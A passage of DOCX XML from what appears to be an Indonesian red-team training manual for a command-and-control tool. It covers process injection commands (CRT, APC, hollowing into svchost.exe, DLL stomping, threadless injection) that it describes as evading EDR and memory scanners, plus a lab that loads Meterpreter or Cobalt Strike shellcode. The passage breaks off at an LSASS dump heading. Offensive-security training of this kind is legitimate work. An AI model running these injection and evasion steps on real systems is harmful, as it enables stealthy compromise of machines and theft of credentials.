            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Lebih stealth dari CRT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>inject self</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Inject shellcode ke proses agent sendiri</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Sedang</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Tidak butuh target PID</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>hollow</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Process hollowing — shell code di proses PE baru</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Tinggi</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Auto-detect PE vs shellcode</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>hijack</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Thread hijack di proses yang berjalan</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Tinggi</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Tidak spawn thread baru</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>stomp (DLL stomping)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Overwrite DLL legitimate di memory dengan shellcode</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Sangat tinggi</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Bypass memory scan</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>mapinject</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>NtMapViewOfSection — shared memory ke proses target</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Tinggi</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Tidak ada RWX alloc</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>threadless</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Overwrite exception handler/callback, tidak spawn thread</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Sangat tinggi</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Paling advanced</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Classic Remote Injection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># CRT injection ke proses target (PID)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>inject remote &lt;agent-id&gt; --pid 3048 --file payload.bin --method crt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APC injection (lebih stealth)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>inject remote &lt;agent-id&gt; --pid 3048 --file payload.bin --method apc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Inject ke proses dengan shellcode base64</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>inject remote &lt;agent-id&gt; --pid 3048 --shellcode-b64 &lt;B64_SHELLCODE&gt; --method crt --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Self Injection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Inject shellcode ke proses agent sendiri</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>inject self &lt;agent-id&gt; --file payload.bin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Via base64 shellcode</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>inject self &lt;agent-id&gt; --shellcode-b64 &lt;B64_SHELLCODE&gt; --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Process Hollowing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Process hollowing men-spawn proses legitimate dalam state suspended, me-replace memory-nya dengan shellcode atau PE, lalu melanjutkan eksekusi. Proses yang terlihat di task manager adalah proses legitimate.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Hollow dengan shellcode (auto-detect)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>hollow &lt;agent-id&gt; --file payload.bin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Hollow dengan PE binary</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>hollow &lt;agent-id&gt; --file payload.exe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Gunakan proses target tertentu sebagai host</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>hollow &lt;agent-id&gt; --file payload.bin --exe svchost.exe --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>DLL Stomping</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>DLL stomping meng-overwrite bagian DLL legitimate yang sudah di-load di memory. Karena backed memory section berasal dari file DLL yang valid, memory scanner yang hanya memeriksa executable sections mungkin tidak mendeteksinya.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Stomp DLL legitimate dengan shellcode</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>stomp &lt;agent-id&gt; \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --file payload.bin \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --dll xpsservices.dll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DLL lain yang bisa dipakai</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># xpsservices.dll, printui.dll, EhStorAuthn.dll, wer.dll</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Threadless Injection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Mengoverwrite exception handler atau callback function di proses target. Tidak men-spawn thread baru — bypass EDR yang memonitor thread creation API calls.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Threadless injection ke PID</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>threadless_inject &lt;agent-id&gt; --pid 3048 --file payload.bin --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:shd w:val="clear" w:color="auto" w:fill="C0392B"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  LAB 11.1  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  Process Hollowing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 1:  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Generate shellcode Meterpreter atau Cobalt Strike untuk lab (atau gunakan calc.exe shellcode).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 2:  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Upload shellcode ke target.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>files upload &lt;agent-id&gt; ./shellcode.bin "C:\Temp\sc.bin"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Eksekusi process hollowing.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>hollow &lt;agent-id&gt; --file "C:\Temp\sc.bin" --exe svchost.exe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Verifikasi proses svchost baru muncul di task manager.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>process list &lt;agent-id&gt; --wait</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Observasi apakah EDR memberikan alert.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="360" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>BAGIAN 12 — CREDENTIAL ACCESS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="8" w:space="1" w:color="C0392B"/>
        </w:pBdr>
        <w:spacing w:before="0" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Credential access adalah fase kritis dalam red team engagement. Credentials yang didapat membuka pintu untuk lateral movement, persistence, dan privilege escalation ke seluruh domain.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>LSASS Dump</w:t>
      </w:r>
    </w:p>
    <w:p>
